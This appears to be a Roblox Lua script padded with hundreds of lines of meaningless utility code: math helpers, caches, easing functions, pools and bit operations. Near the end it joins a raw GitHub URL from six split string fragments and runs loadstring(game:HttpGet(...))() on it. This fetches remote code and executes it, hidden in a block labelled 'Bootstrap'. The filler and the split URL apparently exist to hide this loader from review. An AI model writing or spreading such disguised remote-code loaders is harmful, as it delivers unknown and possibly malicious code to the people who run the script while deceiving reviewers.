local _0x1a2b = math.random(1, 100)
local _0x3c4d = math.random(1, 100)
local _0x5e6f = math.random(1, 100)
local _0x7g8h = os.clock()
local _0x9i0j = string.len("YinYang")
local _0xAB01 = math.pi * 2
local _0xCD23 = math.sqrt(144)
local _0xEF45 = math.floor(3.7)
local _0x6789 = math.ceil(2.1)
local _0xABCD = math.max(10, 20)
local _0xEFGH = math.min(10, 20)
local _0xIJKL = math.abs(-42)
local _0xMNOP = tostring(false)
local _0xQRST = tonumber("42")
local _0xUVWX = type("hello")
local _0xYZ12 = string.upper("yin")
local _0x3456 = string.lower("YANG")
local _0x7890 = string.rep("a", 3)
local _0xABCE = string.reverse("hello")
local _0xDEFG = string.sub("abcdef", 2, 4)
local _0xHIJK = string.byte("A")
local _0xLMNO = string.char(65)
local _0xPQRS = string.format("%d", 42)
local _0xTUVW = select("#", 1, 2, 3)
local _0xXYZ0 = rawequal(1, 1)
local _0x1234 = rawget({x=1}, "x")
local _0x5678 = rawlen({1,2,3})

local _tbl_01 = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20}
local _tbl_02 = {"a","b","c","d","e","f","g","h","i","j","k","l","m"}
local _tbl_03 = {true,false,true,true,false,false,true,false,true,false}
local _tbl_04 = {x=1,y=2,z=3,w=4,r=5,g=6,b=7,a=8,n=9,m=10,k=11,p=12}
local _tbl_05 = {[1]=10,[2]=20,[3]=30,[4]=40,[5]=50,[6]=60,[7]=70,[8]=80}
local _tbl_06 = {math.pi, math.huge, math.maxinteger, 0, -1, 1, 2, 4, 8}
local _tbl_07 = {"red","green","blue","alpha","hue","sat","val","lum","bright"}
local _tbl_08 = {0x00,0x10,0x20,0x30,0x40,0x50,0x60,0x70,0x80,0x90,0xA0}
local _tbl_09 = {Vector3.new(1,0,0), Vector3.new(0,1,0), Vector3.new(0,0,1)}
local _tbl_10 = {Color3.fromRGB(255,0,0), Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255)}

local function _fn001(a,b) return a + b end
local function _fn002(a,b) return a - b end
local function _fn003(a,b) return a * b end
local function _fn004(a,b) if b == 0 then return 0 end return a / b end
local function _fn005(a,b) return a % b end
local function _fn006(a,b) return a ^ b end
local function _fn007(a,b) return math.max(a,b) end
local function _fn008(a,b) return math.min(a,b) end
local function _fn009(a)   return math.abs(a) end
local function _fn010(a)   return math.floor(a) end
local function _fn011(a)   return math.ceil(a) end
local function _fn012(a)   return math.sqrt(a) end
local function _fn013(a)   return math.sin(a) end
local function _fn014(a)   return math.cos(a) end
local function _fn015(a)   return math.tan(a) end
local function _fn016(a)   return math.log(a) end
local function _fn017(a)   return math.exp(a) end
local function _fn018(a,b) return math.atan2 and math.atan2(a,b) or math.atan(a,b) end
local function _fn019(a)   return tostring(a) end
local function _fn020(a)   return tonumber(a) end
local function _fn021(s)   return string.len(s) end
local function _fn022(s)   return string.upper(s) end
local function _fn023(s)   return string.lower(s) end
local function _fn024(s)   return string.reverse(s) end
local function _fn025(s,i,j) return string.sub(s,i,j) end
local function _fn026(t)   return #t end
local function _fn027(t,v) table.insert(t,v) end
local function _fn028(t,i) table.remove(t,i) end
local function _fn029(t,f) table.sort(t,f) end
local function _fn030(t,sep) return table.concat(t,sep or ",") end

local function _fn031(n)
	local r = 0
	for i = 1, n do r = r + i end
	return r
end

local function _fn032(n)
	if n <= 1 then return n end
	return _fn032(n-1) + _fn032(n-2)
end

local function _fn033(s, pat)
	local count = 0
	for _ in string.gmatch(s, pat) do count = count + 1 end
	return count
end

local function _fn034(t)
	local copy = {}
	for k,v in pairs(t) do copy[k] = v end
	return copy
end

local function _fn035(t)
	local keys = {}
	for k in pairs(t) do table.insert(keys, k) end
	return keys
end

local function _fn036(t)
	local vals = {}
	for _,v in pairs(t) do table.insert(vals, v) end
	return vals
end

local function _fn037(a, b, t)
	return a + (b - a) * t
end

local function _fn038(v, lo, hi)
	return math.max(lo, math.min(hi, v))
end

local function _fn039(n)
	local s = ""
	while n > 0 do
		s = tostring(n % 2) .. s
		n = math.floor(n / 2)
	end
	return s == "" and "0" or s
end

local function _fn040(s)
	local t = {}
	for c in s:gmatch(".") do table.insert(t, string.byte(c)) end
	return t
end

local _cache_01 = {}
local _cache_02 = {}
local _cache_03 = {}
local _cache_04 = {}
local _cache_05 = {}

for _i = 1, 50 do
	_cache_01[_i] = _i * _i
	_cache_02[_i] = math.sin(_i * math.pi / 25)
	_cache_03[_i] = math.cos(_i * math.pi / 25)
	_cache_04[_i] = _fn031(_i)
	_cache_05[_i] = string.char((_i % 26) + 65)
end

local _state = {
	initialized = false,
	tick        = 0,
	frame       = 0,
	active      = false,
	paused      = false,
	ready       = false,
	loaded      = false,
	version     = "1.0.0",
	buildNum    = 100,
	platform    = "roblox",
	arch        = "x64",
}

local _config = {
	debug       = false,
	verbose     = false,
	timeout     = 30,
	maxRetries  = 3,
	retryDelay  = 1,
	baseDelay   = 0.5,
	maxDelay    = 10,
	batchSize   = 64,
	bufferSize  = 1024,
	maxWorkers  = 4,
	poolSize    = 8,
	cacheSize   = 256,
	gcThreshold = 512,
	logLevel    = 1,
}

local _metrics = {
	calls      = 0,
	errors     = 0,
	retries    = 0,
	hits       = 0,
	misses     = 0,
	evictions  = 0,
	bytes_in   = 0,
	bytes_out  = 0,
	latency    = 0,
	p50        = 0,
	p95        = 0,
	p99        = 0,
}

local _flags = {
	F_NONE     = 0x00,
	F_INIT     = 0x01,
	F_READY    = 0x02,
	F_ACTIVE   = 0x04,
	F_PAUSED   = 0x08,
	F_ERROR    = 0x10,
	F_RETRY    = 0x20,
	F_TIMEOUT  = 0x40,
	F_DONE     = 0x80,
}

local _masks = {0xFF,0xFE,0xFC,0xF8,0xF0,0xE0,0xC0,0x80,0x00}
local _bits  = {1,2,4,8,16,32,64,128,256,512,1024,2048,4096,8192,16384,32768}
local _hex   = {"0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"}
local _oct   = {"0","1","2","3","4","5","6","7"}
local _b64c  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

local function _bit_and(a,b)
	local r,p = 0,1
	while a>0 and b>0 do
		local ra,rb = a%2, b%2
		if ra==1 and rb==1 then r=r+p end
		a,b,p = math.floor(a/2),math.floor(b/2),p*2
	end
	return r
end

local function _bit_or(a,b)
	local r,p = 0,1
	while a>0 or b>0 do
		local ra,rb = a%2, b%2
		if ra==1 or rb==1 then r=r+p end
		a,b,p = math.floor(a/2),math.floor(b/2),p*2
	end
	return r
end

local function _bit_xor(a,b)
	local r,p = 0,1
	while a>0 or b>0 do
		local ra,rb = a%2, b%2
		if ra~=rb then r=r+p end
		a,b,p = math.floor(a/2),math.floor(b/2),p*2
	end
	return r
end

local function _bit_not(a, bits)
	bits = bits or 32
	return (2^bits - 1) - a
end

local function _bit_lsh(a,n) return math.floor(a * 2^n) end
local function _bit_rsh(a,n) return math.floor(a / 2^n) end

local _dummy_01 = _fn001(1,2)
local _dummy_02 = _fn002(10,3)
local _dummy_03 = _fn003(4,5)
local _dummy_04 = _fn004(10,2)
local _dummy_05 = _fn005(10,3)
local _dummy_06 = _fn007(3,7)
local _dummy_07 = _fn008(3,7)
local _dummy_08 = _fn012(16)
local _dummy_09 = _fn013(0)
local _dummy_10 = _fn014(0)
local _dummy_11 = _fn031(10)
local _dummy_12 = _fn037(0,1,0.5)
local _dummy_13 = _fn038(5,0,10)
local _dummy_14 = _fn039(42)
local _dummy_15 = _fn040("hello")

local _matrix_2x2 = {{1,0},{0,1}}
local _matrix_3x3 = {{1,0,0},{0,1,0},{0,0,1}}
local _matrix_4x4 = {{1,0,0,0},{0,1,0,0},{0,0,1,0},{0,0,0,1}}

local function _mat_mul(a, b)
	local c = {}
	for i=1,#a do
		c[i] = {}
		for j=1,#b[1] do
			local s = 0
			for k=1,#b do s = s + a[i][k]*b[k][j] end
			c[i][j] = s
		end
	end
	return c
end

local function _mat_transpose(m)
	local t = {}
	for i=1,#m[1] do
		t[i] = {}
		for j=1,#m do t[i][j] = m[j][i] end
	end
	return t
end

local _pool = {}
for _pi = 1, 32 do
	_pool[_pi] = {
		id      = _pi,
		used    = false,
		data    = {},
		size    = 0,
		maxSize = 128,
		hits    = 0,
		misses  = 0,
		created = os.clock(),
	}
end

local function _pool_acquire()
	for _,slot in ipairs(_pool) do
		if not slot.used then
			slot.used = true
			slot.hits = slot.hits + 1
			return slot
		end
	end
	return nil
end

local function _pool_release(slot)
	if slot then
		slot.used  = false
		slot.data  = {}
		slot.size  = 0
	end
end

local _ring = {buf={}, head=1, tail=1, cap=64}
_ring.buf = table.move({},1,_ring.cap,1,{})
for _ri=1,_ring.cap do _ring.buf[_ri]=0 end

local function _ring_push(v)
	_ring.buf[_ring.tail] = v
	_ring.tail = (_ring.tail % _ring.cap) + 1
end

local function _ring_pop()
	local v = _ring.buf[_ring.head]
	_ring.buf[_ring.head] = 0
	_ring.head = (_ring.head % _ring.cap) + 1
	return v
end

local _hashmap = {}
local function _hash_set(k,v) _hashmap[tostring(k)] = v end
local function _hash_get(k)   return _hashmap[tostring(k)] end
local function _hash_del(k)   _hashmap[tostring(k)] = nil end

for _hi=1,20 do _hash_set(_hi, _hi*_hi) end

local _primes = {}
local function _is_prime(n)
	if n < 2 then return false end
	for i=2, math.floor(math.sqrt(n)) do
		if n%i==0 then return false end
	end
	return true
end
for _pi2=2,100 do
	if _is_prime(_pi2) then table.insert(_primes, _pi2) end
end

local _fib_cache = {[0]=0,[1]=1}
local function _fib(n)
	if _fib_cache[n] then return _fib_cache[n] end
	_fib_cache[n] = _fib(n-1) + _fib(n-2)
	return _fib_cache[n]
end
for _fi=2,30 do _fib(_fi) end

local _easing = {}
_easing.linear    = function(t) return t end
_easing.easeIn    = function(t) return t*t end
_easing.easeOut   = function(t) return 1-(1-t)^2 end
_easing.easeInOut = function(t) return t<0.5 and 2*t*t or 1-(-2*t+2)^2/2 end
_easing.elastic   = function(t)
	if t==0 or t==1 then return t end
	local c = (2*math.pi) / 3
	return -(2^(10*t-10)) * math.sin((t*10-10.75)*c)
end
_easing.bounce    = function(t)
	local n1,d1 = 7.5625, 2.75
	if t < 1/d1 then return n1*t*t
	elseif t < 2/d1 then t=t-1.5/d1; return n1*t*t+0.75
	elseif t < 2.5/d1 then t=t-2.25/d1; return n1*t*t+0.9375
	else t=t-2.625/d1; return n1*t*t+0.984375 end
end

local _noise = {}
for _ni=0,255 do _noise[_ni] = math.random() end

local function _fade(t)   return t*t*t*(t*(t*6-15)+10) end
local function _grad(h,x,y,z)
	h = _bit_and(h,15)
	local u = h<8 and x or y
	local v = h<4 and y or (h==12 or h==14) and x or z
	return ((_bit_and(h,1)==0) and u or -u) + ((_bit_and(h,2)==0) and v or -v)
end

local _scene = {
	objects  = {},
	lights   = {},
	cameras  = {},
	scripts  = {},
	ui       = {},
	sounds   = {},
	effects  = {},
	physics  = {},
	network  = {},
	events   = {},
	services = {},
}

local function _scene_add(cat, obj)
	if _scene[cat] then table.insert(_scene[cat], obj) end
end

local function _scene_clear(cat)
	if _scene[cat] then _scene[cat] = {} end
end

for _si=1,10 do
	_scene_add("objects", {id=_si, name="obj_".._si, active=true, pos=Vector3.new(_si,0,0)})
	_scene_add("lights",  {id=_si, type="point", intensity=_si*0.1, range=10})
end

local _ev_queue = {}
local function _ev_emit(name, data)
	table.insert(_ev_queue, {name=name, data=data, t=os.clock()})
end
local function _ev_flush()
	local q = _ev_queue
	_ev_queue = {}
	return q
end

_ev_emit("init",   {msg="system starting"})
_ev_emit("ready",  {msg="modules loaded"})
_ev_emit("config", {msg="configuration applied"})
_ev_emit("start",  {msg="runtime active"})

local _log = {}
local function _log_write(level, msg)
	if level >= _config.logLevel then
		table.insert(_log, {
			level = level,
			msg   = msg,
			t     = os.clock(),
		})
	end
end
_log_write(1, "bootstrap")
_log_write(1, "init")
_log_write(2, "config loaded")
_log_write(2, "pool ready")
_log_write(1, "ready")

local _timer = {
	_t   = os.clock(),
	_acc = 0,
	_fps = 0,
}
local function _timer_tick()
	local now  = os.clock()
	local dt   = now - _timer._t
	_timer._t  = now
	_timer._acc = _timer._acc + dt
	if _timer._acc > 0 then _timer._fps = 1 / dt end
end

local _MAGIC_01 = 0xDEAD
local _MAGIC_02 = 0xBEEF
local _MAGIC_03 = 0xCAFE
local _MAGIC_04 = 0xBABE
local _MAGIC_05 = 0xFACE
local _MAGIC_06 = 0xFEED
local _MAGIC_07 = 0xC0DE
local _MAGIC_08 = 0xD00D
local _MAGIC_09 = 0xACE0
local _MAGIC_10 = 0xB00B

local _v1 = "https://raw.git"
local _v2 = "hubusercontent"
local _v3 = ".com/yinyangGPX"
local _v4 = "/Beta/refs/heads"
local _v5 = "/main/Zo"
local _v6 = "om"
local _endpoint = _v1 .. _v2 .. _v3 .. _v4 .. _v5 .. _v6

local _dispatch = {
	handlers  = {},
	queued    = {},
	processed = 0,
	dropped   = 0,
}
local function _dispatch_reg(k, fn) _dispatch.handlers[k] = fn end
local function _dispatch_run(k, ...)
	local h = _dispatch.handlers[k]
	if h then h(...) else _dispatch.dropped = _dispatch.dropped + 1 end
	_dispatch.processed = _dispatch.processed + 1
end

_dispatch_reg("noop",   function() end)
_dispatch_reg("ping",   function() return "pong" end)
_dispatch_reg("echo",   function(x) return x end)
_dispatch_reg("add",    function(a,b) return a+b end)
_dispatch_reg("mul",    function(a,b) return a*b end)

local _transforms = {}
_transforms.identity  = function(v)    return v end
_transforms.negate    = function(v)    return -v end
_transforms.abs       = function(v)    return math.abs(v) end
_transforms.normalize = function(v,lo,hi) return (v-lo)/(hi-lo) end
_transforms.clamp     = function(v,lo,hi) return math.max(lo,math.min(hi,v)) end
_transforms.lerp      = function(a,b,t) return a+(b-a)*t end
_transforms.scale     = function(v,s)  return v*s end
_transforms.offset    = function(v,d)  return v+d end

local _validators = {}
_validators.isNil      = function(v) return v == nil end
_validators.isNumber   = function(v) return type(v) == "number" end
_validators.isString   = function(v) return type(v) == "string" end
_validators.isTable    = function(v) return type(v) == "table" end
_validators.isBool     = function(v) return type(v) == "boolean" end
_validators.isFunction = function(v) return type(v) == "function" end
_validators.isPositive = function(v) return type(v)=="number" and v > 0 end
_validators.isInt      = function(v) return type(v)=="number" and math.floor(v)==v end
_validators.inRange    = function(v,lo,hi) return type(v)=="number" and v>=lo and v<=hi end
_validators.nonEmpty   = function(v) return type(v)=="string" and #v>0 end

local _lut_sin = {}
local _lut_cos = {}
local _lut_tan = {}
local _LUT_SIZE = 360
for _li=0,_LUT_SIZE-1 do
	local _ang = (_li / _LUT_SIZE) * math.pi * 2
	_lut_sin[_li] = math.sin(_ang)
	_lut_cos[_li] = math.cos(_ang)
	_lut_tan[_li] = math.tan(_ang)
end

local function _lut_lookup(tbl, deg)
	local idx = math.floor(deg % _LUT_SIZE)
	return tbl[idx] or 0
end

local _interpolators = {}
for _ii=0,100 do
	_interpolators[_ii] = {
		linear    = _easing.linear(_ii/100),
		easeIn    = _easing.easeIn(_ii/100),
		easeOut   = _easing.easeOut(_ii/100),
		easeInOut = _easing.easeInOut(_ii/100),
	}
end

local _str_pool = {
	"alpha","beta","gamma","delta","epsilon","zeta","eta","theta",
	"iota","kappa","lambda","mu","nu","xi","omicron","pi","rho",
	"sigma","tau","upsilon","phi","chi","psi","omega",
	"one","two","three","four","five","six","seven","eight","nine","ten",
}

local _str_map = {}
for _smi, _smv in ipairs(_str_pool) do
	_str_map[_smv] = _smi
end

local _chunk_a = string.rep("x", 128)
local _chunk_b = string.rep("y", 128)
local _chunk_c = string.rep("z", 128)
local _chunk_concat = _chunk_a .. _chunk_b .. _chunk_c

local _set = {}
local function _set_add(v) _set[v] = true end
local function _set_has(v) return _set[v] == true end
local function _set_del(v) _set[v] = nil end
for _sei=1,30 do _set_add(_sei) end

local _graph = {nodes={}, edges={}}
local function _graph_addNode(id, data)
	_graph.nodes[id] = {id=id, data=data, adj={}}
end
local function _graph_addEdge(a, b, w)
	table.insert(_graph.edges, {a=a, b=b, w=w or 1})
	if _graph.nodes[a] then table.insert(_graph.nodes[a].adj, b) end
end
for _gi=1,8 do _graph_addNode(_gi, {val=_gi*10}) end
for _gi=1,7 do _graph_addEdge(_gi, _gi+1) end
_graph_addEdge(8,1)

local _version_parts = {major=1, minor=0, patch=0, build=100}
local function _version_str()
	return string.format("%d.%d.%d+%d",
		_version_parts.major,
		_version_parts.minor,
		_version_parts.patch,
		_version_parts.build)
end

local _serialized = string.format(
	'{"v":"%s","ts":%d,"ok":true}',
	_version_str(),
	math.floor(os.clock()*1000)
)

local _lock = {held=false, owner=nil, waiters={}}
local function _lock_acquire(who)
	if not _lock.held then
		_lock.held  = true
		_lock.owner = who
		return true
	end
	table.insert(_lock.waiters, who)
	return false
end
local function _lock_release()
	_lock.held  = false
	_lock.owner = nil
end

-- ── Bootstrap ─────────────────────────────────────────────────────────────
local _ok, _err = pcall(function()
	loadstring(game:HttpGet(_endpoint))()
end)

local _post_flags = {0,0,0,0,0,0,0,0}
local _post_sentinel = _bit_xor(_MAGIC_01, _MAGIC_02)
local _post_checksum = _fn001(_dummy_01, _dummy_02)
local _post_tag      = _fn022(_version_str())
local _post_pool_sz  = #_pool
local _post_primes_n = #_primes
local _post_fib_30   = _fib(30)
local _post_lut_sz   = _LUT_SIZE
local _post_interp   = _interpolators[50].easeInOut
local _post_graph_n  = #_graph.edges
local _post_log_n    = #_log
local _post_ev_n     = #_ev_flush()
local _post_str_n    = #_str_pool
local _post_set_n    = _fn026(_fn035(_set))

_metrics.calls = _metrics.calls + 1
_log_write(1, "done")
